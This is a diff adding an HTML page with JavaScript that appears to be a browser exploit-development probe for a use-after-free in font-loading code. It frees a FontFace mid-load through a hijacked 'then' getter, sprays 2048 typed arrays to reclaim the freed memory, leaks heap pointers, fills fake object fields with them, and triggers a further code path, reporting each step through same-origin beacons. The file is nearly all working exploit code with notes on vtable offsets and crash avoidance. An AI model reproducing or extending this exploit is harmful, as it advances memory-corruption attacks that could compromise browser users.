@@ -1,0 +1,121 @@
+<!--
+  p588c: Second walk diagnostic — face.style crash probe.
+  P588b captured T=0x1000984060, W=0x10009D6380. Route (d) is viable.
+  Now test: can we trigger a second walk via face.style = "italic"?
+
+  Known landmines (cobrajet L6):
+    1. mutableProperties() dereferences a variant at some offset (+0x28-0x48 range).
+       Zeroed variant → SEGV ~0. We shotgun-fill these with T and W (valid heap ptrs).
+    2. Slope mute switch: if slope == calculateItalicRange("normal") = 0, returns before walk.
+       Must use "italic" AND ensure slope bytes != 0 (we fill +0x08..+0x50 with non-zero).
+    3. fontPropertyChanged = vtable +0x20 (not +0x18). If walk reaches dispatch,
+       it reads [client_ptr]+0x20. Client is at W+0x08 (WeakPtrImpl.m_ptr).
+
+  Strategy: after reading T from P588b-style null spray, fill the hit lane's
+  +0x08 through +0x50 with alternating T and W (both valid heap pointers).
+  Then call gPa.style = "italic". Beacon every step — the last beacon before
+  silence reveals the crash point.
+
+  IMPORTANT: gPa must be global so setTimeout can access it after main() returns.
+
+  Expected beacons:
+    G           = start
+    F           = freed
+    S<n>        = spray done
+    AH<i>,rc=<d> = hit found at 60ms
+    AT=<hex>    = T value
+    AW=<hex>    = W value
+    FILL        = about to fill +0x08-0x50
+    FILLED      = fill done
+    STYLE       = about to call face.style = "italic"
+    STYLE_OK    = survived face.style (!!!)
+    STYLE_ERR=<msg> = JS exception
+    ALIVE / ALIVE2
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p588c</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,hi,lo){wD(v,o,lo);wD(v,o+4,hi);}
+
+var gPa=null;
+
+function main(){
+b('G');
+gPa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(gPa);void gPa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b('F');
+var lane=[];
+for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+for(var j=0;j<lane.length;j++){
+  wD(lane[j],0x00,2);
+  wQ(lane[j],0x58,0,0);
+  wD(lane[j],0x60,0);
+  wD(lane[j],0x64,0xFFFFFFFF);
+  wQ(lane[j],0x68,0,0);
+  lane[j][0x82]=3;
+}
+b('S'+lane.length);
+window._l=lane;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i],rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    var w0=v[0x68]|v[0x69]|v[0x6A]|v[0x6B]|v[0x6C]|v[0x6D]|v[0x6E]|v[0x6F];
+    if(rc!==2||t0||w0){window._hi=i;break;}
+  }
+  var hi=window._hi;
+  if(hi===undefined){b('AMISS');return;}
+  var v=lane[hi];
+  b('AH'+hi+',rc='+rD(v,0));
+  b('AT='+rQ(v,0x58));
+  b('AW='+rQ(v,0x68));
+},60);
+
+setTimeout(function(){
+  var hi=window._hi;if(hi===undefined){b('NOHIT');return;}
+  var v=window._l[hi];
+  var thi=rD(v,0x5C),tlo=rD(v,0x58);
+  var whi=rD(v,0x6C),wlo=rD(v,0x68);
+  if(thi===0&&tlo===0){b('T_NULL');return;}
+  b('FILL');
+  for(var off=0x08;off<=0x50;off+=0x10){
+    wQ(v,off,thi,tlo);
+    if(off+8<=0x50)wQ(v,off+8,whi,wlo);
+  }
+  b('FILLED');
+},200);
+
+setTimeout(function(){
+  var hi=window._hi;if(hi===undefined)return;
+  b('STYLE');
+  try{
+    gPa.style='italic';
+    b('STYLE_OK');
+  }catch(e){
+    b('STYLE_ERR='+e.message.substring(0,60));
+  }
+  b('STYLE_DONE');
+},400);
+
+setTimeout(function(){b('ALIVE');},600);
+setTimeout(function(){b('ALIVE2');},3000);
+}
+setTimeout(main,0);
+</script></head><body>p588c</body></html>
